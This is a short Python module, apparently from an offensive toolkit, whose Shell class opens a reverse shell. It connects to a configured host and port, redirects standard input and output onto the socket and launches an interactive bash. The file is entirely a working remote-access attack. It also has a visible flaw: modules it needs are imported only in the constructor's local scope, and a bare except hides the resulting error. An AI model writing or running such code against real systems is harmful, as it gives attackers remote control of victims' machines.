import socket
import options

class Shell:
    def __init__(self, args):
        self.args = args
        import socket,subprocess,os

    def start(self):
        try:
            print("Starting reverse shell!")
            s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
            s.connect((self.args.target, self.args.port))
            os.dup2(s.fileno(),0)
            os.dup2(s.fileno(),1)
            os.dup2(s.fileno(),2)
            p = subprocess.call(["/bin/bash", "-i"])

        except:
            pass

    def print_options(self):
        o = options.Options()
        o.print_options(self.args.__dict__)

    def update_options(self, option, value):
        self.args.__dict__[option] = value
